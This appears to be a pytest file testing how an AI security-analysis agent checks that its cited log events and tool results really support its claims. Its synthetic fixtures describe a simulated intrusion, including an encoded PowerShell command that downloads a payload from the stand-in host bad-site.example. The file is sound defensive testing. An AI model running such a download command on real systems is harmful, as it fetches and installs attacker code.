"""app/agent/grounding.py: a citation must actually support the claim citing it."""

from datetime import UTC, datetime
from typing import Any

import pytest

from app.agent.case import Evidence, FindingDraft, ToolRef
from app.agent.grounding import (
    action_claims,
    check_actions,
    event_grounds,
    grounded_citations,
    is_absence_claim,
    is_internal_ip,
    text_entities,
)
from scripts.gen.scenario import encode_powershell

TS = datetime(2026, 10, 6, 10, 0, tzinfo=UTC)
POWERSHELL = {
    "event_id": "evt_000010",
    "ts": TS,
    "host": "FIN-WS-02",
    "user": "ben.r",
    "event_type": "process_start",
    "process": {
        "pid": 1,
        "name": "powershell.exe",
        "parent_name": "WINWORD.EXE",
        "sha256": "a" * 64,
        "cmdline": "powershell -enc "
        + encode_powershell("iwr http://bad-site.example/x.bin -OutFile C:\\t\\msupdate.exe"),
    },
}
CONNECTION = {
    "event_id": "evt_000011",
    "ts": TS,
    "host": "FIN-WS-02",
    "user": "ben.r",
    "event_type": "network_conn",
    "process": {"pid": 2, "name": "msupdate.exe"},
    "network": {"src_ip": "10.20.1.12", "dst_ip": "203.0.113.5", "dst_port": 443},
}
LOGON = {
    "event_id": "evt_000012",
    "ts": TS,
    "host": "DC-01",
    "user": "ben.r",
    "event_type": "logon",
    "logon": {"src_ip": "10.20.1.12"},
}
FILE_WRITE = {
    "event_id": "evt_000013",
    "ts": TS,
    "host": "FIN-WS-02",
    "user": "ben.r",
    "event_type": "file_write",
    "process": {"pid": 1, "name": "powershell.exe"},
    "file": {"path": r"C:\Users\ben.r\AppData\Roaming\msupdate.exe", "sha256": "b" * 64},
}


@pytest.mark.parametrize(
    ("claim", "doc"),
    [
        ("WINWORD.EXE started PowerShell", POWERSHELL),
        ("The decoded command downloads from bad-site.example", POWERSHELL),
        ("The script saves msupdate.exe", POWERSHELL),
        ("msupdate.exe beacons to 203.0.113.5", CONNECTION),
        ("msupdate was written to disk", FILE_WRITE),
        ("The binary aaaaaaaa is unsigned", POWERSHELL),
        ("ben.r logged on to DC-01", LOGON),
    ],
)
def test_events_ground_claims_that_name_what_they_contain(claim: str, doc: dict[str, Any]) -> None:
    assert event_grounds(claim, doc)


@pytest.mark.parametrize(
    ("claim", "doc"),
    [
        ("FIN-WS-02 is a Windows 11 workstation", POWERSHELL),
        ("ben.r is a non-admin accountant", POWERSHELL),
        ("rclone.exe uploaded files", CONNECTION),
        ("The attacker stole credentials", POWERSHELL),
    ],
)
def test_host_or_user_alone_does_not_ground_a_process_event(
    claim: str, doc: dict[str, Any]
) -> None:
    assert not event_grounds(claim, doc)


def test_names_match_whole_tokens_only() -> None:
    assert not event_grounds("Superpowershell.exe-like behaviour", POWERSHELL)


def test_a_resolved_domain_grounds_a_connection_through_its_label() -> None:
    claim = "The host connected to bad-site.example"

    assert not event_grounds(claim, CONNECTION)
    assert event_grounds(claim, CONNECTION, ["bad-site.example"])


def evidence() -> Evidence:
    return Evidence(
        seen_event_ids={"evt_000010": "alert", "evt_000011": "get_network_connections"},
        tool_refs={
            "tool:get_host_info#2": ToolRef(tool="get_host_info", ok=True, entities=["FIN-WS-02"]),
            "tool:check_reputation#3": ToolRef(
                tool="check_reputation", ok=True, entities=["b" * 64]
            ),
            "tool:search_process_events#4": ToolRef(tool="search_process_events", ok=True),
            "tool:get_dns_queries#5": ToolRef(tool="get_dns_queries", ok=False),
        },
        aliases={"b" * 64: ["msupdate.exe"]},
    )


DOCS = {"evt_000010": POWERSHELL, "evt_000011": CONNECTION}


def citations(claim: str, kind: str, *cited: str) -> list[str]:
    draft = FindingDraft(claim=claim, kind=kind, citations=list(cited))  # type: ignore[arg-type]
    return grounded_citations(draft, kind, DOCS, evidence())


def test_irrelevant_citation_is_removed_and_the_good_one_kept() -> None:
    kept = citations("powershell.exe was launched", "observation", "evt_000010", "evt_000011")

    assert kept == ["evt_000010"]


def test_finding_with_only_irrelevant_citations_is_dropped() -> None:
    assert citations("FIN-WS-02 runs Windows 11", "observation", "evt_000010") == []


def test_host_fact_is_grounded_by_the_tool_result() -> None:
    kept = citations("FIN-WS-02 runs Windows 11", "observation", "tool:get_host_info#2")

    assert kept == ["tool:get_host_info#2"]


def test_reputation_fact_may_name_the_file_instead_of_the_hash() -> None:
    kept = citations("msupdate.exe is known bad", "observation", "tool:check_reputation#3")

    assert kept == ["tool:check_reputation#3"]


@pytest.mark.parametrize(
    "citation",
    ["evt_999999", "tool:get_host_info#99", "tool:get_dns_queries#5", "not a citation", ""],
)
def test_unseen_failed_or_malformed_citations_are_removed(citation: str) -> None:
    assert citations("powershell.exe ran on FIN-WS-02", "observation", citation) == []


def test_absence_claim_needs_a_successful_tool_citation() -> None:
    claim = "No persistence was observed"

    assert citations(claim, "absence", "tool:search_process_events#4") != []
    assert citations(claim, "absence", "tool:get_dns_queries#5") == []
    assert citations("No powershell.exe child was observed", "absence", "evt_000010") == []


@pytest.mark.parametrize(
    "claim",
    [
        "No other processes were observed",
        "No network connections from powershell.exe",
        "There is no evidence of lateral movement",
        "No persistence found",
        "msupdate.exe did not contact any host",
        "The script was not seen again",
    ],
)
def test_absence_claims_are_recognised(claim: str) -> None:
    assert is_absence_claim(claim)


@pytest.mark.parametrize(
    "claim",
    [
        "msupdate.exe has no signer",
        "ben.r is a non-admin user",
        "WINWORD.EXE started powershell.exe",
        "The notice was shown to the user",
    ],
)
def test_field_values_are_not_absence_claims(claim: str) -> None:
    assert not is_absence_claim(claim)


def test_reserved_ranges_are_not_treated_as_internal() -> None:
    # ipaddress.is_private is True for these, which would hide the scenarios' bad infrastructure.
    assert not is_internal_ip("203.0.113.5")
    assert not is_internal_ip("198.51.100.7")
    assert is_internal_ip("10.20.1.12")
    assert is_internal_ip("192.168.1.1")


def test_text_entities_find_domains_ips_and_files() -> None:
    found = text_entities("iwr http://bad-site.example/a.bin 203.0.113.9 -OutFile C:\\x\\up.exe")

    assert {"bad-site.example", "203.0.113.9", "a.bin", "up.exe"} <= found


# --- action claims: the process named must be the one the event shows acting -----------------

F11 = (
    r"The file C:\Users\ben.r\AppData\Roaming\msupdate.exe was created by msupdate.exe (pid 24756)"
)
ACTION_DOCS = {"evt_000010": POWERSHELL, "evt_000011": CONNECTION, "evt_000013": FILE_WRITE}
PAYLOAD_START = {
    "event_id": "evt_000014",
    "event_type": "process_start",
    "host": "FIN-WS-02",
    "process": {"pid": 2, "name": "msupdate.exe", "parent_name": "powershell.exe"},
}


def action_evidence() -> Evidence:
    return Evidence(
        seen_event_ids={e: "x" for e in [*ACTION_DOCS, "evt_000014"]},
        tool_refs={
            "tool:get_process_tree#2": ToolRef(
                tool="get_process_tree", ok=True, entities=["msupdate.exe", "powershell.exe"]
            )
        },
        aliases={"b" * 64: ["msupdate.exe"]},
    )


def action_citations(claim: str, *cited: str) -> list[str]:
    draft = FindingDraft(claim=claim, kind="observation", citations=list(cited))
    docs = ACTION_DOCS | {"evt_000014": PAYLOAD_START}
    return grounded_citations(draft, "observation", docs, action_evidence())


def test_f11_wrong_actor_citing_only_a_tool_result_is_dropped() -> None:
    assert action_citations(F11, "tool:get_process_tree#2") == []


def test_f11_wrong_actor_citing_the_write_event_is_dropped() -> None:
    # The event names msupdate.exe in its path, so plain grounding passes; the writer is PowerShell.
    assert action_citations(F11, "evt_000013") == []


def test_the_true_version_of_f11_keeps_its_citation() -> None:
    claim = r"powershell.exe wrote C:\Users\ben.r\AppData\Roaming\msupdate.exe"

    assert action_citations(claim, "evt_000013", "tool:get_process_tree#2") == [
        "evt_000013",
        "tool:get_process_tree#2",
    ]


@pytest.mark.parametrize(
    ("claim", "cited", "kept"),
    [
        # The event type must fit the action, whatever the process.
        ("msupdate.exe connected to 203.0.113.5", "evt_000011", True),
        ("msupdate.exe wrote a file", "evt_000011", False),
        ("Network connection from msupdate.exe to 203.0.113.5", "evt_000011", True),
        ("Network connection from powershell.exe to 203.0.113.5", "evt_000011", False),
        # A process start's actor is its parent, in either voice.
        ("WINWORD.EXE spawned powershell.exe", "evt_000010", True),
        ("powershell.exe was started by WINWORD.EXE", "evt_000010", True),
        ("powershell.exe spawned WINWORD.EXE", "evt_000010", False),
        ("WINWORD.EXE was launched by powershell.exe", "evt_000010", False),
        ("powershell.exe (pid 9396) launched msupdate.exe", "evt_000014", True),
        ("msupdate.exe (pid 24756) was launched by powershell.exe", "evt_000014", True),
        # With no object, the process may simply have started.
        ("msupdate.exe started at 09:55", "evt_000014", True),
        ("msupdate.exe was launched", "evt_000014", True),
        ("powershell.exe was launched", "evt_000014", False),
    ],
)
def test_action_claims_match_actor_and_event_type(claim: str, cited: str, kept: bool) -> None:
    assert bool(action_citations(claim, cited)) is kept


def test_a_stem_counts_as_a_process_name_when_seen_in_the_case() -> None:
    assert action_citations("PowerShell wrote msupdate.exe", "evt_000013") == ["evt_000013"]
    assert action_citations("Msupdate wrote msupdate.exe", "evt_000013") == []


def test_every_action_in_a_claim_needs_an_event() -> None:
    claim = "powershell.exe launched msupdate.exe, which connected to 203.0.113.5"

    assert action_citations(claim, "evt_000014") == []
    assert action_citations(claim, "evt_000014", "evt_000011") == ["evt_000014", "evt_000011"]


def test_citations_showing_no_action_are_removed() -> None:
    claim = "powershell.exe wrote msupdate.exe"

    assert action_citations(claim, "evt_000013", "evt_000010") == ["evt_000013"]


def test_claims_without_an_acting_process_are_not_action_checked() -> None:
    assert action_claims("The script wrote a log entry", {"powershell"}) == []
    assert check_actions(
        "The script wrote a log entry", ["evt_000013"], ACTION_DOCS, Evidence()
    ) == ["evt_000013"]
